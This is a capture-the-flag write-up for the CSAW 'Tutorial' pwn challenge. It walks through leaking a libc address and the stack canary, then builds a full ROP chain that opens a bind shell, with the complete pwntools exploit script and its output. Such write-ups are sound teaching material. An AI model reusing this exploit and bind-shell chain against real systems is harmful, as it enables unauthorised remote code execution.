---
value: 200
category: Pwn
author: SneakyNachos
---

# Tutorial

Ok sport, now that you have had your Warmup, maybe you want to checkout the Tutorial.

`nc pwn.chal.csaw.io 8002`

# Solution

Write up by: SneakyNachos

This one I decided later on to redo and just go all out with the rop chain 
out of boredom.

After setting up the service on a remote vm with the same libc I decided to 
check what the output was.

	$ nc 192.168.56.102 54321
	-Tutorial-
	1.Manual
	2.Practice
	3.Quit
	>

After typing "1" a reference is dumped
	
	>1
	Reference:0x7f5635853860
	-Tutorial-
	1.Manual
	2.Practice
	3.Quit
	>


Looking into the binary this location seems to be a dump of the glibc's puts
function location. This will allow us to bypass ASLR.

After typing "2" it seems they just want a payload. Examining further into the 
defenses the binary also has the stack canary on and DEP as well.

So that means they must have a cookie dump in option '2'. My guess was that 
they didn't append the null byte correctly and the dumped the stack in a print.

Here's a test script to see if that hunch was correct. I also went ahead and
added the glibc address extraction to the script as well.

	from pwn import *
	def main():
		#Test Connection
		HOST = "192.168.56.102"
		PORT = int(raw_input("PORT:").rstrip("\n"))
		
		#HOST = "pwn.chal.csaw.io"
		#PORT = 8002
		
		r = remote(HOST,PORT)
		payload = "A"*300
		
		#Dump output from service
		for x in xrange(0,4):
			print r.recvline()
		
		#Extract/strip/calculate the libc starting address
		r.sendline("1")	
		reference = r.recvline()
		libcadr = int(reference.split(":")[1].strip('\n'),0)-456800
		print hex(libcadr)
		
		#Get the cookie
		r.sendline("2")
		print r.recvline()
		for x in xrange(0,4):
			print r.recvline()
		r.sendline(payload)
		
		#Spacing
		r.recvline()
		
		#Mem dump of cookie
		memdump = r.recvline()
		
		#Strip the cookie out
		memdump = memdump.rstrip("-Tutorial-\n")
		cookie = struct.unpack("<Q",memdump[len(memdump)-12:len(memdump)-4])
		print hex(cookie[0])
		
		#Spacing
		for x in xrange(0,3):
			print r.recvline()
		
		cookie = struct.pack("<Q",cookie[0])
	
	main()

Running this outputs

	$ python s2.py 
	PORT:54321
	[+] Opening connection to 192.168.56.102 on port 54321: Done
	-Tutorial-
	1.Manual
	2.Practice
	3.Quit
	0x7f56357e4000
	-Tutorial-
	1.Manual
	2.Practice
	3.Quit
	>Time to test your exploit...
	0x55d60df6b3385400
	[*] Closed connection to 192.168.56.102 port 54321

Cool now we have the defeat to the stack canary and ASLR. Now to defeat DEP.

What I did now was then use ROPgadget to dump the all the gadgets out of the libc.
	ROPgadget --binary libc-2.19.so > gadgets.txt

My rop chain goal was to initiate a bind-shell on their system and print the flag.

First I needed more space. Looking at the registers right before the crash I 
noticed that after the last read that most of the piping was intact.

This means I could reuse most of the registers and consume more into the stack 
then initially meant to.

## Addition to s.py

	#read(pipe,stack,0x700)
	init = ''
	init += struct.pack('<Q',libcadr+0xbcdee) # xor eax,eax; pop rdx; ret
	init += struct.pack('<Q',0x700) #Rop chain size
	init += struct.pack("<Q",libcadr+0xc1d05) # syscall; ret

With the above gadgets I now forced the new read to take in 0x700 from the 
original pipe and consume more data into the stack.

Now to make the payload.

## Additon to s.py
	
	payload = "A"*(300)+"B"*4+"C"*4+"D"*4+cookie+"E"*4+"F"*4+init

The above pops the overflow uses the cookie to bypass the stack canary and then 
uses the rop gadgets to consume more from the pipe to allow another payload.

Now I just needed a bindshell made entirely out of rop gadgets.

The first part would be to make the socket call

	p = ''
	p+= struct.pack('<Q',libcadr+0x00000000000b4a21) # xor edx, edx ; add rsp, 8 ; mov rax, rdx ; ret
	p+= struct.pack('<Q',0x4141414141414141) #Pad
	p+= struct.pack('<Q',libcadr+0x000000000003763d) # xor eax, eax ; nop ; ret
	p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
	p+= struct.pack('<Q',0x29)              # rax = 0x29
	p+= struct.pack('<Q',libcadr+0x00024885)#pop rsi
	p+= struct.pack('<Q',0x1)               # rsi = 0x1
	p+= struct.pack('<Q',libcadr+0x00022b9a)#pop rdi
	p+= struct.pack('<Q',0x2)	        # rdi = 0x2
	p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret Socket(2,1,0)

Next we write the socket structure to the .data section of glibc

	#Write socket data
	p += struct.pack('<Q', libcadr+0x000bcdf0) # pop rdx; ret
	p += '\x02\x00\xe0\x15\x00\x00\x00\x00'    # Type 2, port 57365
	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
	p += struct.pack('<Q', libcadr+0x00000000003be080) # @ .data ; rdi = .data

Now the bind system call to use the newly setup socket structure

	#Setup bind syscall
	p += struct.pack('<Q', libcadr+0x1fca7)# mov qword ptr [rdi], rdx ; ret
	p += struct.pack('<Q', libcadr+0x24885)# pop rsi ; ret
	p += struct.pack('<Q', libcadr+0x3be080) # @ .data
	p += struct.pack('<Q',libcadr+0x1960d7) # xchg eax, edi ; ret
	p += struct.pack('<Q',libcadr+0x000bcdf0) # pop rdx; ret
	p += struct.pack('<Q',0x10)               # rdx = 0x10
	p+= struct.pack('<Q',libcadr+0x000487a8)  #pop rax, ret
	p+= struct.pack('<Q',0x31)                # rax = 0x31
	p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret Bind(fd,.data,16)

Once the bind is complete the system call will return a file descriptor to listen on.

So now we create a listen.

	p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
	p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
	p+= struct.pack('<Q',0x32)              # rax = 0x32
	p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret Listen(fd)

Now we do the accept call.

	p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
	p+= struct.pack('<Q',0x2b)              # rax = 0x2b
	p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret

Now we just have to dup stdin and stdout so that we can communicate.

I took a guess here and decided I needed like three dup2 calls to make this work
and since the eax had the file descriptor I could just step backwards and exchange
with esi to cheat the lack of rop gadgets I had.

	p += struct.pack('<Q',libcadr+0x00000000001960d7) # #xchg eax, edi ; ret
	p+= struct.pack('<Q',libcadr+0x00024885)#pop rsi
	p+= struct.pack('<Q',0x2)               # rsi = 0x2
	p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
	p+= struct.pack('<Q',0x21)              # rax = 0x21
	p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret

	p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
	p+= struct.pack('<Q',libcadr+0x000000000003851f)# : sub eax, 1 ; ret
	p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
	p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
	p+= struct.pack('<Q',0x21)              # rax = 0x21
	p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret

	p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
	p+= struct.pack('<Q',libcadr+0x000000000003851f)# : sub eax, 1 ; ret
	p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
	p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
	p+= struct.pack('<Q',0x21)
	p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret

Now we just needed to get '/bin/sh' to run once we connect to the target system.

Once again I used the glibc data section to write '/bin/sh' to  memory and just 
pointed execve's arguments to that newly written glibc data section.

	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
	p += struct.pack('<Q', libcadr+0x00000000003be080+16) # @ .data
	p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
	p += '/bin//sh'                                    # rax = '/bin/sh'
	p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
	p += struct.pack('<Q', 0x4141414141414141) # padding
	p += struct.pack('<Q', 0x4141414141414141) # padding
	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
	p += struct.pack('<Q', libcadr+0x00000000003be088+16) # @ .data + 8
	p += struct.pack('<Q', libcadr+0x0000000000088b75) # xor rax, rax ; ret
	p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
	p += struct.pack('<Q', 0x4141414141414141) # padding
	p += struct.pack('<Q', 0x4141414141414141) # padding
	p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
	p += struct.pack('<Q', libcadr+0x00000000003be080+16) # @ .data
	p += struct.pack('<Q', libcadr+0x0000000000024885) # pop rsi ; ret
	p += struct.pack('<Q', libcadr+0x00000000003be088+16) # @ .data + 8
	p += struct.pack('<Q', libcadr+0x0000000000001b8e) # pop rdx ; ret
	p += struct.pack('<Q', libcadr+0x00000000003be088+16) # @ .data + 8
	p += struct.pack('<Q', libcadr+0x0000000000088b75) # xor rax, rax ; ret
	p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
	p+= struct.pack('<Q',0x3b)
	p += struct.pack('<Q', libcadr+0x000000000000269f) # syscall

Now to setup the sends for this large payload.

	r.sendline("2")
	for x in xrange(0,1):
		print r.recvline()
	r.sendline(payload)
	r.sendline("B"*len(payload)+p)

	#HOST = "192.168.56.101"
        PORT = 57365
        r = remote(HOST,PORT)
	r.sendline("whoami")
	print r.recvline()
	r.sendline("ls")
	print r.recvline()
	r.sendline("cat flag")
	print r.recvline()

The final script should now look like.

	from pwn import *
	def main():
		#Test Connection
		HOST = "192.168.56.102"
		PORT = int(raw_input("PORT:").rstrip("\n"))
		
		#HOST = "pwn.chal.csaw.io"
		#PORT = 8002
		
		r = remote(HOST,PORT)
		payload = "A"*300
		
		#Dump output from service
		for x in xrange(0,4):
			print r.recvline()
		
		r.sendline("1")
		#Extract/strip/calculate the libc starting address
		reference = r.recvline()
		libcadr = int(reference.split(":")[1].strip('\n'),0)-456800
		print hex(libcadr)
		
		#Get the cookie
		r.sendline("2")
		print r.recvline()
		for x in xrange(0,4):
			print r.recvline()
		r.sendline(payload)
		
		#Spacing
		r.recvline()
		
		#Mem dump of cookie
		memdump = r.recvline()
		
		#Strip the cookie out
		memdump = memdump.rstrip("-Tutorial-\n")
		cookie = struct.unpack("<Q",memdump[len(memdump)-12:len(memdump)-4])
		print hex(cookie[0])
		
		#Spacing
		for x in xrange(0,3):
			print r.recvline()
		
		cookie = struct.pack("<Q",cookie[0])
		
		#Rop chain for extra space for the next bindshell rop chain
		#read(pipe,stack,0x700)
		init = ''
		init += struct.pack('<Q',libcadr+0xbcdee) # xor eax,eax; pop rdx; ret
		init += struct.pack('<Q',0x700) #Rop chain size
		init += struct.pack("<Q",libcadr+0xc1d05) # syscall; ret
		
		#initial payload
		payload = "A"*(300)+"B"*4+"C"*4+"D"*4+cookie+"E"*4+"F"*4+init
		
		#Final payload - bindshell
		p = ''
		p+= struct.pack('<Q',libcadr+0x00000000000b4a21) # xor edx, edx ; add rsp, 8 ; mov rax, rdx ; ret
		p+= struct.pack('<Q',0x4141414141414141) #Pad
		p+= struct.pack('<Q',libcadr+0x000000000003763d) # xor eax, eax ; nop ; ret
		p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
		p+= struct.pack('<Q',0x29)              # rax = 0x29
		p+= struct.pack('<Q',libcadr+0x00024885)#pop rsi
		p+= struct.pack('<Q',0x1)               # rsi = 0x1
		p+= struct.pack('<Q',libcadr+0x00022b9a)#pop rdi
		p+= struct.pack('<Q',0x2)	        # rdi = 0x2
		p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret Socket(2,1,0)
		
		#Write socket data
		p += struct.pack('<Q', libcadr+0x000bcdf0) # pop rdx; ret
		p += '\x02\x00\xe0\x15\x00\x00\x00\x00'    # Type 2, port 57365
		p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
		p += struct.pack('<Q', libcadr+0x00000000003be080) # @ .data ; rdi = .data
		
		#Setup bind syscall
		p += struct.pack('<Q', libcadr+0x1fca7)# mov qword ptr [rdi], rdx ; ret
		p += struct.pack('<Q', libcadr+0x24885)# pop rsi ; ret
		p += struct.pack('<Q', libcadr+0x00000000003be080) # @ .data
		p += struct.pack('<Q',libcadr+0x00000000001960d7) # xchg eax, edi ; ret
		p += struct.pack('<Q',libcadr+0x000bcdf0) # pop rdx; ret
		p += struct.pack('<Q',0x10)               # rdx = 0x10
		p+= struct.pack('<Q',libcadr+0x000487a8)  #pop rax, ret
		p+= struct.pack('<Q',0x31)                # rax = 0x31
		p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret Bind(fd,.data,16)
		
		p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
		p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
		p+= struct.pack('<Q',0x32)              # rax = 0x32
		p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret Listen(fd)
		
		p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
		p+= struct.pack('<Q',0x2b)              # rax = 0x2b
		p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret
		
		p += struct.pack('<Q',libcadr+0x00000000001960d7) # #xchg eax, edi ; ret
		p+= struct.pack('<Q',libcadr+0x00024885)#pop rsi
		p+= struct.pack('<Q',0x2)               # rsi = 0x2
		p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
		p+= struct.pack('<Q',0x21)              # rax = 0x21
		p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret
		
		p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
		p+= struct.pack('<Q',libcadr+0x000000000003851f)# : sub eax, 1 ; ret
		p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
		p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
		p+= struct.pack('<Q',0x21)              # rax = 0x21
		p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret
		
		p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
		p+= struct.pack('<Q',libcadr+0x000000000003851f)# : sub eax, 1 ; ret
		p+= struct.pack('<Q',libcadr+0x0000000000110cef) # xchg eax, esi ; ret
		p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
		p+= struct.pack('<Q',0x21)
		p += struct.pack('<Q',libcadr+0x00000000000c1d05) # syscall; ret
		
		p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
		p += struct.pack('<Q', libcadr+0x00000000003be080+16) # @ .data
		p += struct.pack('<Q', libcadr+0x000000000001b290) # pop rax ; ret
		p += '/bin//sh'                                    # rax = '/bin/sh'
		p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
		p += struct.pack('<Q', 0x4141414141414141) # padding
		p += struct.pack('<Q', 0x4141414141414141) # padding
		p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
		p += struct.pack('<Q', libcadr+0x00000000003be088+16) # @ .data + 8
		p += struct.pack('<Q', libcadr+0x0000000000088b75) # xor rax, rax ; ret
		p += struct.pack('<Q', libcadr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
		p += struct.pack('<Q', 0x4141414141414141) # padding
		p += struct.pack('<Q', 0x4141414141414141) # padding
		p += struct.pack('<Q', libcadr+0x0000000000022b9a) # pop rdi ; ret
		p += struct.pack('<Q', libcadr+0x00000000003be080+16) # @ .data
		p += struct.pack('<Q', libcadr+0x0000000000024885) # pop rsi ; ret
		p += struct.pack('<Q', libcadr+0x00000000003be088+16) # @ .data + 8
		p += struct.pack('<Q', libcadr+0x0000000000001b8e) # pop rdx ; ret
		p += struct.pack('<Q', libcadr+0x00000000003be088+16) # @ .data + 8
		p += struct.pack('<Q', libcadr+0x0000000000088b75) # xor rax, rax ; ret
		p+= struct.pack('<Q',libcadr+0x000487a8)#pop rax, ret
		p+= struct.pack('<Q',0x3b)
		p += struct.pack('<Q', libcadr+0x000000000000269f) # syscall
		
		r.sendline("2")
		for x in xrange(0,1):
		print r.recvline()
		r.sendline(payload)
		r.sendline("B"*len(payload)+p)
		
		#HOST = "192.168.56.101"
		PORT = 57365
		r = remote(HOST,PORT)
		r.sendline("whoami")
		print r.recvline()
		r.sendline("ls")
		print r.recvline()
		r.sendline("cat flag")
		print r.recvline()
					
		pass
	main()

Now for the testing.

	$ python s.py
	PORT:54321
	[+] Opening connection to 192.168.56.102 on port 54321: Done
	-Tutorial-
	
	1.Manual
	
	2.Practice
	
	3.Quit
	
	0x7f56357e4000
	-Tutorial-
	
	1.Manual
	
	2.Practice
	
	3.Quit
	
	>Time to test your exploit...
	
	0x55d60df6b3385400
	1.Manual
	
	2.Practice
	
	3.Quit
	
	>Time to test your exploit...

	[+] Opening connection to 192.168.56.102 on port 57365: Done
	tutorial

	flag

	FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}

	[*] Closed connection to 192.168.56.102 port 57365
	[*] Closed connection to 192.168.56.102 port 54321

Not to shabby for a monster of a rop chain.

Testing on their system took me about six tries of changing the bind-shell port 
probably because someone was already using the port to communicate with the box.

# Flag
	
	FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}

